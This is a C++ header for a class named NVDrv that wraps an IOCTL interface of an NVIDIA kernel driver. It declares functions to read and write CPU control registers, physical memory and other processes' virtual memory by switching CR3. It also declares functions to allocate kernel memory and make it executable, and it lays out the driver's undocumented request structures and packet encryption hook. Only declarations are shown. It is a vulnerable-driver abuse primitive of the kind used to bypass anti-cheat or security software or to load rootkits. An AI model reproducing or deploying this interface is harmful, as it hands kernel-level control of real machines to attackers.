#pragma once
#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>

class NVDrv
{
public:
    DWORD ReadCr(int cr);
    BOOL WriteCr(int cr, DWORD64 value);
    std::wstring GetProcessPath(const std::wstring& process_name);
    uintptr_t GetProcessBase(const std::wstring& process_name);
    uintptr_t GetProcessCR3(uintptr_t base_address);
    uintptr_t GetSystemCR3();
    uintptr_t MmGetPhysicalAddress(uintptr_t virtual_address);
    BOOL ReadPhysicalMemory(uintptr_t physical_address, void* OUT res, int size);
    BOOL WritePhysicalMemory(uintptr_t physical_address, void* IN res, int size);
    BOOL ReadVirtualMemory(uintptr_t address, LPVOID output, unsigned long size);
    BOOL WriteVirtualMemory(uintptr_t address, LPVOID data, unsigned long size);
    BOOL SwapReadContext(uintptr_t target_cr3);

    void* AllocateKernelMemory(size_t size);
    bool MakeMemoryExecutable(void* address, size_t size);

    NVDrv();

    template<typename T>
    T Read(uintptr_t address)
    {
        T buffer;
        if (!ReadVirtualMemory(address, &buffer, sizeof(T)))
            return NULL;
        return buffer;
    }

    template<typename T>
    BOOL Write(uintptr_t address, T val)
    {
        if (!WriteVirtualMemory(address, (LPVOID)&val, sizeof(T)))
            return FALSE;
        return TRUE;
    }

    enum NVControlRegisters {
        CR0 = 0,
        CR2 = 2,
        CR3 = 3,
        CR4 = 4
    };

private:
    static int constexpr ioctl_code = 0x9C40A484;

    enum class NVFunction : int
    {
        read_cr = 0,
        write_cr = 1,
        phys_req = 0x26,
        phys_read = 0x14,
        phys_write = 0x15
    };

    struct request { };

    struct request_memcpy : request
    {
        NVFunction request_id;
        int size;
        __int64 dst_addr;
        __int64 src_addr;
        char unk[0x20];
        unsigned __int64 packet_key[0x40 / 8];
        char unk_data[0x138 - 0x40 - 56];
    };

    struct request_phys_addr : request
    {
        NVFunction request_id;
        int unk_0;
        __int64 result_addr;
        __int64 virtual_addr;
        int writevalue;
        char unk[0x20 - 4];
        unsigned __int64 packet_key[0x40 / 8];
        char unk_data[0x138 - 0x40 - 56];
    };

    struct request_readcr : request
    {
        NVFunction request_id;
        int unk_0;
        int cr_num;
        int unk10;
        int unk14;
        int unk18;
        int result;
        char unk[0x20 - 4];
        unsigned __int64 packet_key[0x40 / 8];
        char unk_data[0x138 - 0x40 - 56];
    };

    struct request_writecr : request
    {
        NVFunction request_id;
        int unk_0;
        int cr_num;
        int unk10;
        int unk14;
        int unk18;
        int writevalue;
        char unk[0x20 - 4];
        unsigned __int64 packet_key[0x40 / 8];
        char unk_data[0x138 - 0x40 - 56];
    };

    void* (*encrypt_payload)(request* data_crypt, int, void* temp_buf) = nullptr;
    HANDLE nvhandle = INVALID_HANDLE_VALUE;
    uintptr_t target_cr3 = 0;

    uintptr_t TranslateLinearToPhysicalAddress(uintptr_t virtual_address);
};

// Define DEBUG if not already defined
#ifndef DEBUG
#define DEBUG 1
#endif
